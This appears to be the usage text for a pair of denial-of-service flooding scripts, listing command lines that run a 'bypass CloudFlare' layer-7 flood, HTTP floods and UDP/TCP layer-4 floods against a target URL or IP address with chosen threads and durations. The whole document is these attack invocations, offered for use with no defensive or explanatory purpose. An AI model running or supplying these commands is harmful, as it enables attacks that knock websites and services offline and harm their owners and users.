#  bypass CloudFlare
python l7.py cfb url.com 500 120
#  HTTP 
python l7.py http url.com 300 200

Method: http-ctf
Url: example.com
Threads: 2
Seconds: 120



#  UDP
python l4.py udp 192.168.1.100 80 500 60
# TCP  
python l4.py tcp 192.168.1.100 443 300 30

Method: udp-tcp
Ip: 192.168.1.100 
Port: 443
Threads: 300
Seconds: 60
